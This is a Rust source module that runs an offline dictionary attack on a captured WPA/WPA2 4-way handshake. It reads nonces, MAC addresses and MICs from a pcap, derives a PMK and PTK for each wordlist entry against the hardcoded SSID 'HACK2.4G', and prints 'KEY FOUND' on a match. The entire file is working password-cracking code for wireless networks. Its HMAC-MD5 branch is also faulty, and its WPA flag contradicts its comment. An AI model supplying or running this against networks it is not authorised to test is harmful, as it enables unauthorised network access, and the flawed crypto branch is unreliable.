extern crate ring;

use hex;
use std::thread;
use md5::{Md5, Digest};
use std::time::Duration;
use ring::{pbkdf2, hmac};
use std::num::NonZeroU32;
use owo_colors::OwoColorize;

use indicatif::{ProgressBar,ProgressStyle,MultiProgress};
// use crate::components::pcapformatter;

use super::pcapformatter::formater;

pub fn process_packets(
    wfile_path: &str,
    pfile_path: &str
){
    //Read a file of passwords containing
    //passwords separated by a newline
    let pcap_data = formater(pfile_path);
    let passwordlist: Vec<String> = std::fs::read_to_string(wfile_path)
        .expect("Failed to read file")
        .lines()
        .map(String::from)
        .collect();
    //SSID name
    //let ssid = "Coherer";
    let ssid = "HACK2.4G";
    // ANonce
    let a_nonce = hex::decode(pcap_data.a_nonce).expect("Failed to decode ANonce");
    // SNonce
    let s_nonce = hex::decode(pcap_data.s_nonce).expect("Failed to decode SNonce");
    // Authenticator MAC (AP)
    let ap_mac = hex::decode(pcap_data.ap_mac).expect("Failed to decode Authenticator MAC");
    // Station address: MAC of client
    let cli_mac = hex::decode(pcap_data.cli_mac).expect("Failed to decode Client MAC");
    // The first MIC
    let mic1 = &pcap_data.mic1;
    // The entire 802.1x frame of the second handshake message with the MIC field set to all zeros
    let data1 = hex::decode(pcap_data.data1)
    .expect("Failed to decode Data1");
    // The second MIC
    let mic2 = &pcap_data.mic2;
    // The entire 802.1x frame of the third handshake message with the MIC field set to all zeros
    let data2 = hex::decode(pcap_data.data2)
    .expect("Failed to decode Data2");
    // The third MIC
    let mic3 = &pcap_data.mic3;
    // The entire 802.1x frame of the forth handshake message with the MIC field set to all zeros
    let data3 = hex::decode(pcap_data.data3)
    .expect("Failed to decode Data3");
    // Run an offline dictionary attack against the access point
    test_pwds(passwordlist, ssid, &a_nonce, &s_nonce, &ap_mac, &cli_mac, &data1, &data2, &data3, mic1, mic2, mic3);
}
// Pseudo-random function for generation of
// the pairwise transient key (PTK)
// key:       The PMK
// A:         b'Pairwise key expansion'
// B:         The apMac, cliMac, aNonce, and sNonce concatenated
//            like mac1 mac2 nonce1 nonce2
//            such that mac1 < mac2 and nonce1 < nonce2
// return:    The ptk
fn prf(key: &[u8], a: &[u8], b: &[u8]) -> Vec<u8> {
    let n_byte = 64;
    let mut i = 0;
    let mut r: Vec<u8> = Vec::new();
    let key = hmac::Key::new(hmac::HMAC_SHA1_FOR_LEGACY_USE_ONLY, key);
    while i <= ((n_byte * 8 + 159) / 160) {
        let mut context = hmac::Context::with_key(&key);
        context.update(a);
        context.update(&[0x00]);
        context.update(b);
        context.update(&[i as u8]);
        let mac = context.sign();
        r.extend(mac.as_ref());
        i += 1;
    }
    r.truncate(n_byte);
    r
}

fn min(a: &[u8], b: &[u8]) -> Vec<u8> {
    if a < b {
        a.to_vec()
    } else {
        b.to_vec()
    }
}

fn max(a: &[u8], b: &[u8]) -> Vec<u8> {
    if a > b {
        a.to_vec()
    } else {
        b.to_vec()
    }
}
// Make parameters for the generation of the PTK
// aNonce:        The aNonce from the 4-way handshake
// sNonce:        The sNonce from the 4-way handshake
// apMac:         The MAC address of the access point
// cliMac:        The MAC address of the client
// return:        (A, B) where A and B are parameters
// #               for the generation of the PTK
fn make_ab(a_nonce: &[u8], s_nonce: &[u8], ap_mac: &[u8], cli_mac: &[u8]) -> ([u8; 22], Vec<u8>) {
    let a = *b"Pairwise key expansion";
    let b = [
        min(ap_mac, cli_mac),
        max(ap_mac, cli_mac),
        min(a_nonce, s_nonce),
        max(a_nonce, s_nonce),
    ]
    .concat();
    (a, b)
}
// Compute the 1st message integrity check for a WPA 4-way handshake
// pwd:       The password to test
// ssid:      The ssid of the AP
// A:         b'Pairwise key expansion'
// B:         The apMac, cliMac, aNonce, and sNonce concatenated
//            like mac1 mac2 nonce1 nonce2
//            such that mac1 < mac2 and nonce1 < nonce2
// data:      A list of 802.1x frames with the MIC field zeroed
// return:    (x, y, z) where x is the mic, y is the PTK, and z is the PMK
fn make_mic(
    pwd: &str,
    ssid: &str,
    a: &[u8],
    b: &[u8],
    data: &[u8],
    wpa: bool,
) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    // Create the pairwise master key using 4096 iterations of PBKDF2-HMAC-SHA1
    let mut pmk = vec![0; 32];
    let mut salt = Vec::new();
    salt.extend_from_slice(ssid.as_bytes());
    pbkdf2::derive(
        pbkdf2::PBKDF2_HMAC_SHA1,
        NonZeroU32::new(4096).unwrap(),
        &salt,
        pwd.as_bytes(),
        // ssid.as_bytes(),
        &mut pmk,
    );
    // Make the pairwise transient key (PTK)
    let ptk = prf(&pmk, a, b);
    // Create the MICs using HMAC-MD5 for WPA and HMAC-SHA1 for WPA2
    let hmac_func: fn(&[u8], &[u8]) -> Vec<u8> = if wpa {
        |key, data| {
            let hmac_key = hmac::Key::new(hmac::HMAC_SHA1_FOR_LEGACY_USE_ONLY, key);
            hmac::sign(&hmac_key, data).as_ref().to_vec()
        }
    } else {
        |key, _data| {
            let hmac_key = Md5::digest(key);
            hmac_key.to_vec()
        }
    };
    let mic = hmac_func(&ptk[0..16], data);
    // let mic_hex = hex::encode(&mic);
    (mic, ptk, pmk)
}

// Run a brief test showing the computation of the PTK, PMK, and MICS
// for a 4-way handshake
fn test_pwds(
    passwordlist: Vec<String>,
    ssid: &str,
    a_nonce: &[u8],
    s_nonce: &[u8],
    ap_mac: &[u8],
    cli_mac: &[u8],
    data1: &[u8],
    data2: &[u8],
    data3: &[u8],
    targ_mic: &str,
    targ_mic2: &str,
    targ_mic3: &str,
) {
    // Pre-computed values
    let m = MultiProgress::new();
    let bar_style = ProgressStyle::with_template("
    {wide_msg}")
    .unwrap();
    let (a, b) = make_ab(a_nonce, s_nonce, ap_mac, cli_mac);
    // let pb = ProgressBar::new(passwordlist.len() as u64);
    //create ProgressBar 
    let progressbar = m.add(ProgressBar::new(passwordlist.len() as u64));
    progressbar.set_style(ProgressStyle::with_template("
    [{elapsed_precise}]
    {wide_msg}
    ")
    .unwrap().progress_chars("=> "));
    //create Master Key Bar
    let master_keybar = m.add(ProgressBar::new(passwordlist.len() as u64));
    master_keybar.set_style(bar_style.clone());
    //create Transient Key Bar
    let transient_keybar = m.add(ProgressBar::new(passwordlist.len() as u64));
    transient_keybar.set_style(bar_style.clone());

    let eapol_hmacbar = m.add(ProgressBar::new(passwordlist.len() as u64));
    eapol_hmacbar.set_style(bar_style.clone());
    // Loop over each password and test each one
    for password in &passwordlist {
        let (mic, ptk, pmk) = make_mic(password, ssid, &a, &b, data1, true);
        let v = hex::encode(&mic[..16]);
        progressbar.inc(1);
        master_keybar.set_message(format!("Master Key    : {}",hex::encode(&pmk[..32])));
        transient_keybar.set_message(format!("Transient Key : {}",hex::encode(&ptk[..64])));
        eapol_hmacbar.set_message(format!("EAPOL HMAC    : {v}"));
        if v != targ_mic {
            continue;
        }
        let (mic2, _, _) = make_mic(password, ssid, &a, &b, data2, true);
        let v2 = hex::encode(&mic2[..16]);

        if v2 != targ_mic2 {
            continue;
        }

        let (mic3, _, _) = make_mic(password, ssid, &a, &b, data3, true);
        let v3 = hex::encode(&mic3[..16]);

        if v3 != targ_mic3 {
            continue;
        }
        thread::sleep(Duration::from_millis(12));
        progressbar.set_message(format!("                 KEY FOUND [{}]",password.green()));
        progressbar.finish();
        master_keybar.finish();
        transient_keybar.finish();
        eapol_hmacbar.finish();
        return;
    }
    progressbar.set_message(format!("                 {}","KEY NOT FOUND".red()));
    progressbar.finish();
    master_keybar.finish();
    transient_keybar.finish();
    eapol_hmacbar.finish();
}